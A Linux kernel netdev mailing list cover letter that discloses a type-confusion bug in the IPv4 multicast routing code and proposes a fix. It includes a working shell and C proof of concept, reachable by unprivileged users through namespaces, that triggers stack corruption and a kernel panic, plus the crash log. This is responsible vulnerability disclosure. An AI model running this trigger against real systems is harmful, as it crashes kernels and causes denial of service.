Received: from mail-pj1-f41.google.com (mail-pj1-f41.google.com [209.85.216.41])
	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 9BA1A32B12F
	for <netdev@vger.kernel.org>; Mon, 27 Jul 2026 16:44:58 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=209.85.216.41
ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
	t=1785170700; cv=none; b=Niq7p8yGh1eSad7eE3/lGi5qQb/RgVDc34yh1AWYIIi8N2JoS1/+8/9yJbxYjIBkkgmkcU9zclt+95qVTAQPNxV5nWnl5exKW0nBbiTAhn1cvUBdeJqvoMbfSLRon74qAjWSjtl9PMWPCsgL83+tN292BDvihU/j55YJl3kLVBw=
ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
	s=arc-20240116; t=1785170700; c=relaxed/simple;
	bh=FeneQyNGWgB2uYHOMBzamWmgRbxCqIX2K3LrS5qS1Og=;
	h=From:To:Cc:Subject:Date:Message-ID:MIME-Version; b=CRTaKC+NAe3BW4L1xPH3Ia7zEEXRcl5flplmYip8hfboG6pKirOWMcpBOtp1RVW2QoeyGv2GMXmKrJ2maMSiNaBOyEqdOH3sX1P54Iggsznus1TJyNYdzQgHSJVh+0bCjfRiIo2J3MK5TJZuuOPtYIpo9FvnU5xHF4iR+xt25dQ=
ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=gmail.com; spf=pass smtp.mailfrom=gmail.com; dkim=pass (2048-bit key) header.d=gmail.com header.i=@gmail.com header.b=iC85AFLa; arc=none smtp.client-ip=209.85.216.41
Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=gmail.com
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=gmail.com
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (2048-bit key) header.d=gmail.com header.i=@gmail.com header.b="iC85AFLa"
Received: by mail-pj1-f41.google.com with SMTP id 98e67ed59e1d1-38e071ed6aeso2303952a91.0
        for <netdev@vger.kernel.org>; Mon, 27 Jul 2026 09:44:58 -0700 (PDT)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=gmail.com; s=20251104; t=1785170698; x=1785775498; darn=vger.kernel.org;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:from:to:cc:subject:date:message-id:reply-to:content-type;
        bh=ECM5JpP1hajdkqZEf2mbywRB+0qVl10eLs/2Lkj9898=;
        b=iC85AFLarjEPkGq9+NbsJQ3Bjx4cnGLXTEOyY+X5AQx2ZyKSBgbGN5U5OW1ChThPRl
         J3m6lKsXJwzBsjOuwuzf+eI2MQYOCVXNMx37p8B9ePe3FnG0pVY5lxOBkFN+7yPqW0cT
         H1mJH8/z9JBkUz6U+ejD5sKJ7+6iLZ954iAgY1Ab1xpNJ6Q2RMbu0MtN6xv5kuB4s20L
         Gzm3XKtgTDZjc/I6p6PY7f/V9fxbZkuyhV+dx5U7bL/+U8TCVvjBuNSVrxVAvaLqgt8z
         YNa72QHrXT8irj6hEjquAZk7eEF522VqMWjuBjr1IEFxixwlFrkPxi3tKsGa4FYgfZdT
         IY1w==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20251104; t=1785170698; x=1785775498;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:x-gm-gg:x-gm-message-state:from:to:cc:subject:date
         :message-id:reply-to:content-type;
        bh=ECM5JpP1hajdkqZEf2mbywRB+0qVl10eLs/2Lkj9898=;
        b=UEpyoB8L339bZg8g45h72pCm2uSKUZSnTcUzbqT+m62rumF/69pgOGzrRg622IC4Fi
         JvjgVqNStD3dCXnNAVnJ4XFlsQGATlRw5dPym9EU0UFAjyZQL5t3gJDMZ2XGnE1tinvC
         3ErG7Su/8H0ujfy+egdbwXllJDWrP2+0iARqwDgY6LlGv7JLlUYoBfbaQEwIkDTYabb2
         TAVr04Cr1khw6phyuMAqHZuLVlDb/ptpnihPl6xpQEb3r4HcGXZ6gzTHcq64g2JdIvOo
         tf1PBMlA7CRWXxfWMCpWwsSWiNT/W5UtMgzJm4oAkMvndPQMFarPc2dTVbqXWw8HuHU9
         mLAg==
X-Gm-Message-State: AOJu0YykOtefD4HZ+32/ZOLwsc6AloVb1JcyphBWvug2xvZMEvF5mUzK
	EClrsNlWJju5JJhCTT/JJBYcYvpvL0c37GcPgiCovlEt8nycG7ez0np6Mw+gljpz0f8=
X-Gm-Gg: AR+sD138fmisClEfb2Ya9ARyiImu6EC+0mZUYOk107HvPe5hKUUuGW8n0B7EO0yaGy1
	7n59MvdMq8nS+h1keBJMWdYkfCmg8l8s9HE4CtEeKToG2zQx5K6f9apskqg2Pg6TIQnmBphI47t
	XMEiYNvynCe8blbmtTFm4fqlRjsm0zkwNNpfe/PA5gGUvD2by1psf6EEXaOIzsKViaz39AqRZEi
	9G3L1t2W6lvv2TaOEFn3mk3MqBwKhYRUIZpWnBCtCNDnIW5zWnpQv1lVqZxh90MfkMQu+U9GVCR
	/XRh57mz0Bux74R6J1YviIHNXAXdvBRRo7qMbelNNHvVZdl6POO7jCbbypsSD68W9DB2Mg1JnkJ
	pYpADhdlh9A8g/1paEgyKHqoXJwF3y9hTmd79ZdWIuMe93/gXr1SJtxpXRfrHZmhv7JdgWVMHhY
	YvE3REGcP411QETaZ1ru/s2SPTLXDXRuw=
X-Received: by 2002:a17:90b:58ab:b0:384:8a11:33eb with SMTP id 98e67ed59e1d1-38f29611360mr5990395a91.24.1785170697792;
        Mon, 27 Jul 2026 09:44:57 -0700 (PDT)
Received: from enjou-Legion-Y7000P-2019 ([219.141.235.82])
        by smtp.gmail.com with ESMTPSA id 98e67ed59e1d1-38f64041358sm122139a91.0.2026.07.27.09.44.51
        (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
        Mon, 27 Jul 2026 09:44:57 -0700 (PDT)
From: Ren Wei <enjou1224z@gmail.com>
To: netdev@vger.kernel.org
Cc: dsahern@kernel.org,
	idosch@nvidia.com,
	davem@davemloft.net,
	edumazet@google.com,
	pabeni@redhat.com,
	horms@kernel.org,
	leone4fernando@gmail.com,
	vega@nebusec.ai,
	zhilinz@nebusec.ai,
	enjou1224z@gmail.com
Subject: [PATCH net 0/1] ipmr: only copy pktinfo to cache reports
Date: Tue, 28 Jul 2026 00:44:48 +0800
Message-ID: <cover.1784894076.git.zhilinz@nebusec.ai>
X-Mailer: git-send-email 2.51.0
Precedence: bulk
X-Mailing-List: netdev@vger.kernel.org
List-Id: <netdev.vger.kernel.org>
List-Subscribe: <mailto:netdev+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:netdev+unsubscribe@vger.kernel.org>
MIME-Version: 1.0
Content-Transfer-Encoding: 8bit

From: Zhiling Zou <zhilinz@nebusec.ai>

Hi Linux kernel maintainers,

We found and validated an issue in net/ipv4/ipmr.c. The bug is
reachable by a non-root user after creating user and net namespaces with
namespace-local CAP_NET_ADMIN and CAP_NET_RAW.

We've tested it, and it should not affect any other functionality.

We will provide detailed information about the bug
in this email, along with a PoC to trigger it.

---- details below ----

Bug details:

ipmr_get_route() can clone a synthetic RTM_GETROUTE skb for an unresolved
multicast route and store the requester portid in NETLINK_CB(skb).portid
before queuing it to the unresolved multicast route path.

ipmr_cache_report() later builds a short IGMP report for the raw mroute
socket. To support IP_PKTINFO, it calls ipv4_pktinfo_prepare() on the
original packet and copies the original packet's entire control buffer to
the report skb.

For synthetic route-query packets, that copies NETLINK_CB bytes into a
skb that the raw IPv4 receive path interprets as IPCB. The requester
portid overlaps IPCB(skb)->opt fields. With IP_RECVOPTS or IP_RETOPTS
enabled on the mroute socket, those corrupted option fields can make the
receive path copy beyond the short report packet or overflow the fixed
stack option buffer in ip_options_echo().

The fix keeps IP_PKTINFO support by copying only the pktinfo fields
prepared by ipv4_pktinfo_prepare(), and clears the rest of the report
skb control buffer so no synthetic NETLINK_CB data is exposed as IPCB.

We run the PoC in a 2 vCPU, 2 GB RAM x86 QEMU environment.

------BEGIN poc.sh------

#!/bin/sh
set -eu

mode="${1:-root}"

sysctl -w kernel.panic_on_warn=0 >/dev/null 2>&1 || true
sysctl -w kernel.printk="7 4 1 7" >/dev/null 2>&1 || true

case "$mode" in
root)
	exec ./poc
	;;
namespace)
	exec unshare -Urn --map-root-user ./poc
	;;
*)
	echo "usage: $0 [root|namespace]" >&2
	exit 1
	;;
esac

------END poc.sh--------

------BEGIN poc.c------

#define _GNU_SOURCE

#include <arpa/inet.h>
#include <errno.h>
#include <linux/mroute.h>
#include <linux/netlink.h>
#include <linux/rtnetlink.h>
#include <net/if.h>
#include <sched.h>
#include <stdarg.h>
#include <stdbool.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <unistd.h>

#define DEV_NAME "jwq0"
#define DEV_ADDR "10.23.0.1/24"
#define SRC_ADDR "10.23.0.2"
#define DST_ADDR "239.1.2.3"
#define NETLINK_PORTID 0x000f0001U

static void die(const char *fmt, ...)
{
	va_list ap;

	va_start(ap, fmt);
	vfprintf(stderr, fmt, ap);
	va_end(ap);
	fputc('\n', stderr);
	exit(EXIT_FAILURE);
}

static void die_errno(const char *msg)
{
	die("%s: %s", msg, strerror(errno));
}

static void run_cmd(const char *fmt, ...)
{
	char cmd[512];
	va_list ap;
	int rc;

	va_start(ap, fmt);
	vsnprintf(cmd, sizeof(cmd), fmt, ap);
	va_end(ap);

	printf("[cmd] %s\n", cmd);
	fflush(stdout);
	rc = system(cmd);
	if (rc != 0)
		die("command failed (%d): %s", rc, cmd);
}

static void addattr_l(struct nlmsghdr *nlh, size_t maxlen, int type,
		      const void *data, size_t alen)
{
	size_t len = RTA_LENGTH(alen);
	size_t newlen = NLMSG_ALIGN(nlh->nlmsg_len) + RTA_ALIGN(len);
	struct rtattr *rta;

	if (newlen > maxlen)
		die("netlink attribute overflow");

	rta = (struct rtattr *)(((char *)nlh) + NLMSG_ALIGN(nlh->nlmsg_len));
	rta->rta_type = type;
	rta->rta_len = len;
	memcpy(RTA_DATA(rta), data, alen);
	nlh->nlmsg_len = newlen;
}

static int create_dummy_interface(void)
{
	unsigned int ifindex;

	run_cmd("ip link del %s 2>/dev/null || true", DEV_NAME);
	run_cmd("ip link set lo up");
	run_cmd("ip link add %s type dummy", DEV_NAME);
	run_cmd("ip addr add %s dev %s", DEV_ADDR, DEV_NAME);
	run_cmd("ip link set %s up", DEV_NAME);

	ifindex = if_nametoindex(DEV_NAME);
	if (!ifindex)
		die_errno("if_nametoindex(" DEV_NAME ")");

	printf("[*] %s ifindex=%u\n", DEV_NAME, ifindex);
	return (int)ifindex;
}

static int setup_mroute_socket(int ifindex)
{
	struct vifctl vif = {
		.vifc_vifi = 0,
		.vifc_flags = VIFF_USE_IFINDEX,
		.vifc_threshold = 1,
		.vifc_rate_limit = 0,
		.vifc_lcl_ifindex = ifindex,
	};
	int opt = 1;
	int fd;

	fd = socket(AF_INET, SOCK_RAW, IPPROTO_IGMP);
	if (fd < 0)
		die_errno("socket(AF_INET, SOCK_RAW, IPPROTO_IGMP)");

	if (setsockopt(fd, SOL_IP, IP_RETOPTS, &opt, sizeof(opt)) < 0)
		die_errno("setsockopt(IP_RETOPTS)");

	if (setsockopt(fd, IPPROTO_IP, MRT_INIT, &opt, sizeof(opt)) < 0)
		die_errno("setsockopt(MRT_INIT)");

	if (setsockopt(fd, IPPROTO_IP, MRT_ADD_VIF, &vif, sizeof(vif)) < 0)
		die_errno("setsockopt(MRT_ADD_VIF)");

	printf("[*] mroute socket ready on vif ifindex=%d\n", ifindex);
	return fd;
}

static int setup_netlink_socket(void)
{
	struct sockaddr_nl local = {
		.nl_family = AF_NETLINK,
		.nl_pid = NETLINK_PORTID,
	};
	int fd;

	fd = socket(AF_NETLINK, SOCK_RAW, NETLINK_ROUTE);
	if (fd < 0)
		die_errno("socket(AF_NETLINK, SOCK_RAW, NETLINK_ROUTE)");

	if (bind(fd, (struct sockaddr *)&local, sizeof(local)) < 0)
		die_errno("bind(AF_NETLINK)");

	printf("[*] netlink portid=0x%08x\n", NETLINK_PORTID);
	printf("[*] portid bytes: optlen=%u srr=%u rr=%u ts=%u\n",
	       NETLINK_PORTID & 0xff,
	       (NETLINK_PORTID >> 8) & 0xff,
	       (NETLINK_PORTID >> 16) & 0xff,
	       (NETLINK_PORTID >> 24) & 0xff);
	return fd;
}

static void trigger_getroute(int nl_fd, int ifindex)
{
	struct {
		struct nlmsghdr nlh;
		struct rtmsg rtm;
		char buf[256];
	} req;
	struct sockaddr_nl kernel = {
		.nl_family = AF_NETLINK,
	};
	struct iovec iov = {
		.iov_base = &req,
		.iov_len = sizeof(req),
	};
	struct msghdr msg = {
		.msg_name = &kernel,
		.msg_namelen = sizeof(kernel),
		.msg_iov = &iov,
		.msg_iovlen = 1,
	};
	struct in_addr src;
	struct in_addr dst;

	memset(&req, 0, sizeof(req));
	req.nlh.nlmsg_len = NLMSG_LENGTH(sizeof(struct rtmsg));
	req.nlh.nlmsg_type = RTM_GETROUTE;
	req.nlh.nlmsg_flags = NLM_F_REQUEST;
	req.nlh.nlmsg_seq = 1;
	req.rtm.rtm_family = AF_INET;
	req.rtm.rtm_dst_len = 32;
	req.rtm.rtm_src_len = 32;

	if (inet_pton(AF_INET, SRC_ADDR, &src) != 1)
		die("inet_pton failed for %s", SRC_ADDR);
	if (inet_pton(AF_INET, DST_ADDR, &dst) != 1)
		die("inet_pton failed for %s", DST_ADDR);

	addattr_l(&req.nlh, sizeof(req), RTA_SRC, &src, sizeof(src));
	addattr_l(&req.nlh, sizeof(req), RTA_DST, &dst, sizeof(dst));
	addattr_l(&req.nlh, sizeof(req), RTA_IIF, &ifindex, sizeof(ifindex));

	iov.iov_len = req.nlh.nlmsg_len;

	printf("[*] sending RTM_GETROUTE for %s -> %s on ifindex %d\n",
	       SRC_ADDR, DST_ADDR, ifindex);
	fflush(stdout);
	if (sendmsg(nl_fd, &msg, 0) < 0)
		die_errno("sendmsg(RTM_GETROUTE)");
}

static void receive_report(int mrt_fd)
{
	char payload[512];
	char control[4096];
	struct iovec iov = {
		.iov_base = payload,
		.iov_len = sizeof(payload),
	};
	struct msghdr msg = {
		.msg_iov = &iov,
		.msg_iovlen = 1,
		.msg_control = control,
		.msg_controllen = sizeof(control),
	};
	ssize_t n;

	printf("[*] waiting for mroute report; recvmsg should crash in IP_RETOPTS\n");
	fflush(stdout);
	n = recvmsg(mrt_fd, &msg, 0);
	if (n < 0)
		die_errno("recvmsg(mroute_sk)");

	printf("[!] recvmsg returned %zd bytes without crashing\n", n);
}

int main(void)
{
	int ifindex;
	int mrt_fd;
	int nl_fd;

	printf("[*] ipmr_cache_report type-confusion trigger\n");
	printf("[*] expected rr copy length comes from first byte of %s (%u)\n",
	       DST_ADDR, 239U);

	ifindex = create_dummy_interface();
	mrt_fd = setup_mroute_socket(ifindex);
	nl_fd = setup_netlink_socket();

	trigger_getroute(nl_fd, ifindex);
	receive_report(mrt_fd);

	close(nl_fd);
	close(mrt_fd);
	return 0;
}

------END poc.c--------

----BEGIN crash log----

[  195.459259] Kernel panic - not syncing: stack-protector: Kernel stack is corrupted in: ip_cmsg_recv_offset (/home/roxy/linux-block-patch/build/../net/ipv4/ip_sockglue.c:65 (discriminator 1) /home/roxy/linux-block-patch/build/../net/ipv4/ip_sockglue.c:187 (discriminator 1))
[  195.460787] CPU: 2 UID: 1028 PID: 1307 Comm: poc Not tainted 6.12.95 #1
[  195.461640] Hardware name: QEMU Ubuntu 24.04 PC v2 (i440FX + PIIX, arch_caps fix, 1996), BIOS 1.16.3-debian-1.16.3-2 04/01/2014
[  195.463100] Call Trace:
[  195.463432]  <TASK>
[  195.463733]  panic (/home/roxy/linux-block-patch/build/../kernel/panic.c:955 (discriminator 1))
[  195.464178]  ? ip_cmsg_recv_offset (/home/roxy/linux-block-patch/build/../net/ipv4/ip_sockglue.c:65 (discriminator 1) /home/roxy/linux-block-patch/build/../net/ipv4/ip_sockglue.c:187 (discriminator 1))
[  195.464769]  __stack_chk_fail (/home/roxy/linux-block-patch/build/../kernel/panic.c:1195 (discriminator 1))
[  195.465309]  ip_cmsg_recv_offset (/home/roxy/linux-block-patch/build/../net/ipv4/ip_sockglue.c:65 (discriminator 1) /home/roxy/linux-block-patch/build/../net/ipv4/ip_sockglue.c:187 (discriminator 1))
[  195.465878]  ? __skb_datagram_iter (/home/roxy/linux-block-patch/build/../include/linux/skbuff.h:2533 /home/roxy/linux-block-patch/build/../net/core/datagram.c:394)
[  195.466458]  ? __pfx_simple_copy_to_iter+0x10/0x10
[  195.467091]  ? ____sys_recvmsg+0x98/0x1d0
[  195.467633]  ? ___sys_recvmsg+0x91/0xe0
[  195.468154]  ? srso_alias_return_thunk+0x5/0xfbef5
[  195.468802]  ? __sys_recvmsg+0x83/0xe0
[  195.469305]  ? do_syscall_64+0x58/0x120
[  195.469824]  ? entry_SYSCALL_64_after_hwframe+0x76/0x7e
[  195.470498]  </TASK>
[  195.470983] Kernel Offset: disabled

-----END crash log-----

Best regards,
Zhiling Zou

Zhiling Zou (1):
  ipmr: only copy pktinfo to cache reports

 net/ipv4/ipmr.c | 6 +++++-
 1 file changed, 5 insertions(+), 1 deletion(-)

-- 
2.43.0
